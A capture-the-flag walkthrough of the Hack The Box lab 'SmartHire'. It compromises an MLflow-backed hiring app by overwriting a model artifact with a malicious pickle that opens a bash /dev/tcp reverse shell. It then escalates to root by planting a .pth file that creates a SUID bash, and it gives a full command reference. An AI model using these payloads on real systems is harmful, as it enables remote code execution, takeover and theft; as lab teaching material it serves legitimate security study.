# SmartHire — Hack The Box Walkthrough

**Difficulty:** Medium  
**OS:** Linux  
**Target IP:** `10.129.245.215`  
**Attacker IP:** `10.10.16.84`  
**Flags:**
- User: `e10bcf6[redacted]36b76ebc`
- Root: `2be9e[redacted]3ab988fd`

---

## Table of Contents
1. [Mindset Before We Start](#mindset-before-we-start)
2. [Step 1 — Reconnaissance: Mapping the Attack Surface](#step-1--reconnaissance-mapping-the-attack-surface)
3. [Step 2 — Web Enumeration: Becoming a User](#step-2--web-enumeration-becoming-a-user)
4. [Step 3 — Subdomain Discovery: Hidden Infrastructure](#step-3--subdomain-discovery-hidden-infrastructure)
5. [Step 4 — MLflow Recon: The Admin Panel](#step-4--mlflow-recon-the-admin-panel)
6. [Step 5 — Model Training: Creating a Target](#step-5--model-training-creating-a-target)
7. [Step 6 — The Vulnerability: Why Pickle is Dangerous](#step-6--the-vulnerability-why-pickle-is-dangerous)
8. [Step 7 — Weaponization: Building the Malicious Pickle](#step-7--weaponization-building-the-malicious-pickle)
9. [Step 8 — Delivery & Exploitation: Overwriting the Model](#step-8--delivery--exploitation-overwriting-the-model)
10. [Step 9 — Foothold: Catching the Shell](#step-9--foothold-catching-the-shell)
11. [Step 10 — Privilege Escalation: From svcweb to root](#step-10--privilege-escalation-from-svcweb-to-root)
12. [Step 11 — Root: Capturing the Final Flag](#step-11--root-capturing-the-final-flag)
13. [Key Lessons & Hacker Mindset](#key-lessons--hacker-mindset)

---

## Mindset Before We Start

> **"Every attack begins with curiosity."**

Before typing a single command, understand the philosophy:
- **We do not know what we do not know.** Our first job is to discover.
- **Every input is an opportunity.** If a system accepts data from us, it can potentially be manipulated.
- **Trust nothing.** Default credentials, client-side validation, and "internal" services are all common failure points.
- **Think in chains.** A low-severity information leak can lead to a medium-severity misconfiguration, which leads to code execution, which leads to root.

This box teaches four core skills:
1. **Service enumeration** (finding hidden subdomains and APIs).
2. **Session analysis** (understanding how the app identifies you).
3. **Insecure deserialization** (one of the most dangerous vulnerability classes).
4. **Python privilege escalation via `.pth` files** (a lesser-known but powerful technique).

---

## Step 1 — Reconnaissance: Mapping the Attack Surface

### 1.1 The `nmap` Scan

```bash
nmap -sC -sV -oN nmap_initial 10.129.245.215
```

**Output:**
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://smarthire.htb/
```

### 1.2 Why We Do This

**The Hacker Mindset:** Before we attack, we need a map. `nmap` is our cartographer. We scan to answer:
- What services are running?
- What versions are they? (Are they vulnerable to known CVEs?)
- What does the default behavior tell us?

Notice that port 80 redirects to `http://smarthire.htb/`. This is a **critical piece of intelligence**. The server is telling us, *"I expect you to call me by this name."* If we don't, virtual hosting might break, and we might miss content.

### 1.3 Fixing `/etc/hosts`

```bash
echo "10.129.245.215 smarthire.htb models.smarthire.htb" | sudo tee -a /etc/hosts
```

**Why this matters:** Modern web servers use **virtual hosts**. The same IP can serve completely different websites depending on the `Host` header in the HTTP request. By adding `smarthire.htb` to `/etc/hosts`, we ensure our browser and tools send the correct hostname. We also preemptively add `models.smarthire.htb` because subdomains are a common expansion of attack surface.

**Baby Step:** Verify it works.
```bash
curl -s -o /dev/null -w "%{http_code}" http://smarthire.htb
# Expected: 200
```

---

## Step 2 — Web Enumeration: Becoming a User

### 2.1 Manual Exploration

Visit `http://smarthire.htb` in a browser or with `curl`. We find:
- A login page (`/login`)
- A registration page (`/register`)

### 2.2 The Hacker Mindset: Every Form is a Door

Registration forms are gifts. They let us:
1. Create a legitimate account to explore the app's functionality.
2. Analyze how the application handles sessions and identity.
3. Potentially find vulnerabilities in the registration logic itself.

**Register an account:**
```bash
curl -s -X POST "http://smarthire.htb/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=hacker&password=hacker&company=TestCorp"
```

**Login and capture the cookie:**
```bash
curl -s -X POST "http://smarthire.htb/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=hacker&password=hacker" \
  -c - | grep session
```

**Output:**
```
#HttpOnly_smarthire.htb	FALSE	/	FALSE	0	session	eyJjb21wYW55IjoiVGVzdENvcnAiLCJ1c2VyX2lkIjoiODQwODFmMzM0NGFhIiwidXNlcm5hbWUiOiJoYWNrZXIifQ.aiA2Ug.FbKP5ysTCbConZsPw3rxjEvIvAk
```

### 2.3 Analyzing the Flask Session

The cookie is a **Flask session**. Flask signs cookies to prevent tampering, but the **payload is transparent** to us. We just need to decode it.

**Structure of a Flask session:**
```
<payload>.<timestamp>.<signature>
```

Extract the payload (first segment before the first dot) and base64-decode it:
```bash
echo "eyJjb21wYW55IjoiVGVzdENvcnAiLCJ1c2VyX2lkIjoiODQwODFmMzM0NGFhIiwidXNlcm5hbWUiOiJoYWNrZXIifQ" | base64 -d
```

**Decoded payload:**
```json
{"company":"TestCorp","user_id":"84081f3344aa","username":"hacker"}
```

### 2.4 Why This is Gold

**The Hacker Mindset:** The application just told us how it thinks about identity. We now know:
- The user is tied to a `company`.
- There's a unique `user_id`.
- The session contains structured data that the backend trusts.

This is **intelligence gathering**. We don't have a vulnerability yet, but we're building a model of the application's internal logic. Later, when we see model names like `TestCorp-84081f3344aa-model`, we'll understand exactly how they were generated.

---

## Step 3 — Subdomain Discovery: Hidden Infrastructure

### 3.1 Finding `models.smarthire.htb`

During enumeration (via `gobuster vhost`, `ffuf`, or manual inspection), we discover a subdomain:
```
models.smarthire.htb
```

**Command to discover it:**
```bash
gobuster vhost -u http://smarthire.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### 3.2 Why Subdomains Matter

**The Hacker Mindset:** Subdomains often represent:
- Admin panels (less tested, more vulnerable).
- Internal APIs (poorly authenticated).
- Third-party integrations (misconfigured defaults).
- Development/staging environments (verbose error messages, debug mode).

`models.smarthire.htb` sounds like it serves ML models. This immediately tells us the application has a **machine learning backend** — and ML pipelines are notorious for insecure deserialization (pickle, joblib, etc.).

---

## Step 4 — MLflow Recon: The Admin Panel

### 4.1 Accessing MLflow

Visit `http://models.smarthire.htb`. We're greeted with an HTTP Basic Auth prompt.

**The Hacker Mindset:** Before trying to brute-force or bypass, try the obvious. Default credentials exist because humans are lazy. The most common default for "admin" panels is:
```
admin:password
admin:admin
admin:123456
```

Try them. In this case:
```
admin:password
```

It works. We now have access to the MLflow tracking server.

### 4.2 Why Default Creds Still Work in 2026

Organizations deploy services quickly. ML engineers need to share experiment tracking. They set up MLflow, add basic auth, and use trivial passwords "just for now." "Just for now" becomes permanent. **Never skip the easy wins.**

### 4.3 Exploring the MLflow API

MLflow exposes a REST API. We can query it with `curl`:

**List registered models:**
```bash
curl -s -u "admin:password" \
  "http://models.smarthire.htb/api/2.0/mlflow/registered-models/list"
```

**Get a specific model:**
```bash
curl -s -u "admin:password" \
  "http://models.smarthire.htb/api/2.0/mlflow/registered-models/get?name=TestCorp-84081f3344aa-model"
```

**Why this is powerful:** The MLflow API gives us programmatic access to model artifacts. If we can overwrite a model file that the main application later loads, we control what code executes.

---

## Step 5 — Model Training: Creating a Target

### 5.1 The Problem: No Model Exists Yet

When we first query for our model, MLflow responds:
```json
{"error_code":"RESOURCE_DOES_NOT_EXIST","message":"Registered Model with name=TestCorp-84081f3344aa-model not found"}
```

**The Hacker Mindset:** This is not a dead end. It tells us that models are created dynamically. We need to trigger the application to create one. Let's explore the main app's functionality.

### 5.2 Uploading Training Data

The dashboard has an endpoint `/upload_hiring_data`. This trains a model and registers it in MLflow.

**Create a valid CSV:**
```bash
cat > /tmp/hiring_data.csv << 'EOF'
experience_years,education_level,interview_score,hired
5,3,85,1
2,2,70,0
7,4,90,1
3,3,65,0
EOF
```

**Upload it:**
```bash
curl -s -X POST "http://smarthire.htb/upload_hiring_data" \
  -b "session=eyJjb21wYW55IjoiVGVzdENvcnAiLCJ1c2VyX2lkIjoiODQwODFmMzM0NGFhIiwidXNlcm5hbWUiOiJoYWNrZXIifQ.aiA2Ug.FbKP5ysTCbConZsPw3rxjEvIvAk" \
  -F "file=@/tmp/hiring_data.csv"
```

**Response:**
```json
{"message":"Model trained and registered successfully","model_deleted":false,"model_info":{"creation_timestamp":1780496083520,"description":"No description","version":"1"},"registered_model":"TestCorp-84081f3344aa-model","status":"success"}
```

### 5.3 Why We Had to Do This

**The Hacker Mindset:** We needed a **target**. You cannot overwrite a model that does not exist. By uploading training data, we forced the application to:
1. Train a model.
2. Serialize it to a pickle file.
3. Register it in MLflow.
4. Expose the artifact path via the API.

Now we have a file we can overwrite.

### 5.4 Extracting the Artifact Path

Query the model again:
```bash
curl -s -u "admin:password" \
  "http://models.smarthire.htb/api/2.0/mlflow/registered-models/get?name=TestCorp-84081f3344aa-model" | python3 -m json.tool
```

**Key values:**
- `run_id`: `dbed21a4ca4a46f1baefae46757e1557`
- `source`: `mlflow-artifacts:/0/dbed21a4ca4a46f1baefae46757e1557/artifacts/model`

The actual file we want is `python_model.pkl` inside that path.

---

## Step 6 — The Vulnerability: Why Pickle is Dangerous

### 6.1 Understanding `pickle` in Python

Python's `pickle` module serializes objects. You can save a Python object to disk and load it later:
```python
import pickle
data = {"key": "value"}
pickle.dump(data, open("file.pkl", "wb"))
obj = pickle.load(open("file.pkl", "rb"))
```

### 6.2 The Fatal Flaw

`pickle.load()` **executes code during deserialization**. It is not a data format like JSON. It is a **protocol for reconstructing Python objects**.

When `pickle.load()` runs, it reads instructions like:
- "Import this module"
- "Call this function with these arguments"
- "Instantiate this class"

**If an attacker controls the pickle file, they control what code executes.**

### 6.3 The `__reduce__` Method

Python classes can define `__reduce__()` to tell pickle how to reconstruct them. We abuse this:
```python
import pickle, os

class RCE(object):
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.16.84/4445 0>&1'",))

pickle.dump(RCE(), open("evil.pkl", "wb"))
```

When the victim runs `pickle.load(open("evil.pkl", "rb"))`, pickle sees:
1. "I need to reconstruct an `RCE` object."
2. "To do that, call `os.system` with this shell command."
3. **Shell command executes.**

### 6.4 Why MLflow is Vulnerable

MLflow's `mlflow.pyfunc.load_model()` internally calls `pickle.load()` on model artifacts. The application at `smarthire.htb` calls this function when a user hits `/predict`. Therefore:

**If we overwrite the model's `.pkl` file with a malicious pickle, the next prediction request triggers our code.**

---

## Step 7 — Weaponization: Building the Malicious Pickle

### 7.1 Writing the Payload

```bash
python3 << 'EOF'
import pickle, os

class RCE(object):
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.16.84/4445 0>&1'",))

with open('/tmp/python_model.pkl', 'wb') as f:
    pickle.dump(RCE(), f)

print("Malicious pickle written to /tmp/python_model.pkl")
EOF
```

### 7.2 Why This Specific Payload?

We use a **reverse shell** because:
1. The target is behind a firewall; we need it to connect *out* to us.
2. `bash -i` gives us an interactive shell.
3. `/dev/tcp/10.10.16.84/4445` is bash's built-in TCP client (no external tools needed).
4. `0>&1` redirects stdin to stdout, completing the bidirectional pipe.

### 7.3 Verifying the Payload

You can inspect it:
```bash
python3 -c "import pickle; print(pickle.load(open('/tmp/python_model.pkl', 'rb')))"
```

**WARNING:** Running this on your own machine will try to connect to yourself. Don't do it unless your listener is ready.

---

## Step 8 — Delivery & Exploitation: Overwriting the Model

### 8.1 Uploading the Malicious Pickle

MLflow exposes an artifact upload API. We PUT our file to overwrite the legitimate model:

```bash
curl -s -u "admin:password" \
  -X PUT "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/dbed21a4ca4a46f1baefae46757e1557/artifacts/model/python_model.pkl" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @/tmp/python_model.pkl
```

**Response:** `{}` (success)

### 8.2 The Hacker Mindset: Supply Chain Attack

What we just did is a **supply chain attack** on a micro scale. We poisoned an artifact that the application trusts. The application did not validate the integrity of the model file before loading it. It assumed:
- "This file came from MLflow, so it must be safe."
- "Only authorized users can upload models."

Both assumptions failed. We are authorized (via `admin:password`), and the file is not safe.

### 8.3 Triggering the Deserialization

Now we need the main app to load our poisoned model. The `/predict` endpoint does exactly this.

First, we need a valid CSV. The app expects `experience` and `skills` columns:
```bash
cat > /tmp/resume.csv << 'EOF'
experience,skills
5,python
3,java
EOF
```

Then trigger it:
```bash
curl -s -X POST "http://smarthire.htb/predict" \
  -b "session=eyJjb21wYW55IjoiVGVzdENvcnAiLCJ1c2VyX2lkIjoiODQwODFmMzM0NGFhIiwidXNlcm5hbWUiOiJoYWNrZXIifQ.aiA2Ug.FbKP5ysTCbConZsPw3rxjEvIvAk" \
  -F "file=@/tmp/resume.csv"
```

---

## Step 9 — Foothold: Catching the Shell

### 9.1 The Listener

Before triggering, start a netcat listener:
```bash
nc -lvnp 4445
```

**Flags explained:**
- `-l`: Listen mode.
- `-v`: Verbose (shows connections).
- `-n`: No DNS resolution (faster).
- `-p 4445`: Port to listen on.

### 9.2 The Callback

After hitting `/predict`, we see:
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.245.215] 55526
bash: cannot set terminal process group (1021): Inappropriate ioctl for device
bash: no job control in this shell
svcweb@smarthire:/var/www/smarthire.htb$
```

### 9.3 Why This Worked

The application's flow was:
1. Receive CSV upload.
2. Call `mlflow.pyfunc.load_model()` to load the latest model.
3. `load_model()` opens `python_model.pkl`.
4. `pickle.load()` executes our `__reduce__` payload.
5. `os.system()` spawns a bash reverse shell.
6. The shell connects back to our listener.

**We never exploited a bug in the web framework.** We exploited the application's **trust** in its data artifacts.

### 9.4 Capturing the User Flag

```bash
whoami
# svcweb

cat ~/user.txt
# e10bcf[redacted]436b76ebc
```

---

## Step 10 — Privilege Escalation: From svcweb to root

### 10.1 Situational Awareness

We have a shell, but it's a low-privilege user. The next question is always:
> **"What can this user do that they shouldn't be able to do?"**

### 10.2 Checking `sudo -l`

```bash
sudo -l
```

**Output:**
```
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

**Why this is huge:**
- `NOPASSWD` means no password required.
- `*` at the end means we can pass **any arguments** to the script.
- We're running a **Python script as root**.

### 10.3 Analyzing `mlflowctl.py`

We need to understand what this script does. Key observations from examining the file:
- It uses `site.addsitedir()` to load plugin directories.
- It looks for `.pth` files in those directories.

### 10.4 The `.pth` File Privilege Escalation

This is a **lesser-known but devastating Python feature**.

**What is a `.pth` file?**
Python's `site` module processes `.pth` files to add directories to `sys.path`. However, **any line in a `.pth` file that starts with `import` is executed as Python code** during path processing.

**From Python documentation:**
> "Lines starting with import are executed."

This means if we can write a `.pth` file to a directory that `site.addsitedir()` processes, we get **arbitrary code execution** the next time Python starts.

### 10.5 Finding a Writable Plugin Directory

```bash
find /opt/tools/mlflow_ctl/plugins/ -writable 2>/dev/null
```

**Output:**
```
/opt/tools/mlflow_ctl/plugins/dev
```

**Why this exists:** Development plugin directories are often left writable so developers can hot-swap code. In production, this is a critical misconfiguration.

### 10.6 Planting the Exploit

We write a `.pth` file that creates a SUID bash binary:

```bash
echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash")' > /opt/tools/mlflow_ctl/plugins/dev/evil.pth
```

**What this does:**
1. `cp /bin/bash /tmp/rootbash` copies bash to `/tmp`.
2. `chmod 4755 /tmp/rootbash` sets the **SUID bit**.
- The SUID bit means: "When anyone runs this file, run it as the **owner** of the file."
- Since `cp` preserves ownership context and we're about to run this as root... the owner becomes root.

### 10.7 Triggering Root Execution

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

**What happens:**
1. Python starts as root.
2. `mlflowctl.py` calls `site.addsitedir('/opt/tools/mlflow_ctl/plugins/dev')`.
3. Python scans `plugins/dev/` and finds `evil.pth`.
4. It executes the `import` line in `evil.pth`.
5. Our `os.system()` runs as root.
6. `/tmp/rootbash` is created with root ownership and SUID bit set.

---

## Step 11 — Root: Capturing the Final Flag

### 11.1 Escalating to Root

```bash
/tmp/rootbash -p
```

**Why `-p`?**
When bash has the SUID bit, it normally drops privileges for security. The `-p` flag tells bash to **preserve** the effective user ID. Without `-p`, you'd still be `svcweb`. With `-p`, you become root.

**Verify:**
```bash
id
# uid=1000(svcweb) gid=1000(svcweb) euid=0(root) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

Notice `euid=0(root)` — effective user ID is root.

### 11.2 The Root Flag

```bash
cat /root/root.txt
# 2be9e87[redacted]3ab988fd
```

---

## Key Lessons & Hacker Mindset

### 1. Default Credentials Are Not a Myth
We tried `admin:password` and it worked. Always try the obvious before building a sledgehammer.

### 2. Understand the Application's Business Logic
By decoding the Flask session, we learned how model names were constructed (`{company}-{user_id}-model`). This let us predict and query our own model.

### 3. Data is Code
Pickle is not JSON. Never deserialize untrusted data with `pickle.load()`. If you see pickle in a web app, there's probably a deserialization vulnerability.

### 4. Supply Chain Attacks Are Powerful
We didn't exploit the web server directly. We poisoned an artifact it trusted. This is how modern APTs operate — SolarWinds, NotPetya, etc. The principle is the same.

### 5. Read the Documentation
The `.pth` privesc works because Python's `site` module executes `import` lines. This is documented behavior, not a bug. Sometimes features are vulnerabilities.

### 6. Always Check `sudo -l`
Even a restricted `sudo` (only one script, only one user) can lead to root if the script does something dangerous or loads user-controlled code.

### 7. SUID + bash -p = Root
Understanding how Unix permissions work (SUID, EUID, `bash -p`) turns a simple file copy into a root shell.

---

## Full Command Reference

```bash
# === RECON ===
echo "10.129.245.215 smarthire.htb models.smarthire.htb" | sudo tee -a /etc/hosts
nmap -sC -sV 10.129.245.215

# === WEB ENUM ===
curl -s -X POST "http://smarthire.htb/register" -d "username=hacker&password=hacker&company=TestCorp"
curl -s -X POST "http://smarthire.htb/login" -d "username=hacker&password=hacker" -c -

# === MLFLOW ENUM ===
curl -s -u "admin:password" "http://models.smarthire.htb/api/2.0/mlflow/registered-models/get?name=TestCorp-84081f3344aa-model"

# === MODEL TRAINING ===
cat > /tmp/hiring_data.csv << 'EOF'
experience_years,education_level,interview_score,hired
5,3,85,1
2,2,70,0
7,4,90,1
3,3,65,0
EOF
curl -s -X POST "http://smarthire.htb/upload_hiring_data" -b "session=..." -F "file=@/tmp/hiring_data.csv"

# === BUILD PAYLOAD ===
python3 -c "
import pickle, os
class RCE(object):
    def __reduce__(self):
        return (os.system, (\"bash -c 'bash -i >& /dev/tcp/10.10.16.84/4445 0>&1'\",))
with open('/tmp/python_model.pkl', 'wb') as f:
    pickle.dump(RCE(), f)
"

# === DELIVER PAYLOAD ===
curl -s -u "admin:password" -X PUT \
  "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/dbed21a4ca4a46f1baefae46757e1557/artifacts/model/python_model.pkl" \
  -H "Content-Type: application/octet-stream" --data-binary @/tmp/python_model.pkl

# === TRIGGER SHELL ===
nc -lvnp 4445
curl -s -X POST "http://smarthire.htb/predict" -b "session=..." -F "file=@/tmp/resume.csv"

# === USER FLAG ===
cat ~/user.txt

# === PRIVESC ===
sudo -l
find /opt/tools/mlflow_ctl/plugins/ -writable 2>/dev/null
echo 'import os; os.system(\"cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\")' > /opt/tools/mlflow_ctl/plugins/dev/evil.pth
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
/tmp/rootbash -p
cat /root/root.txt
```

---

*Writeup completed. Happy hacking!*
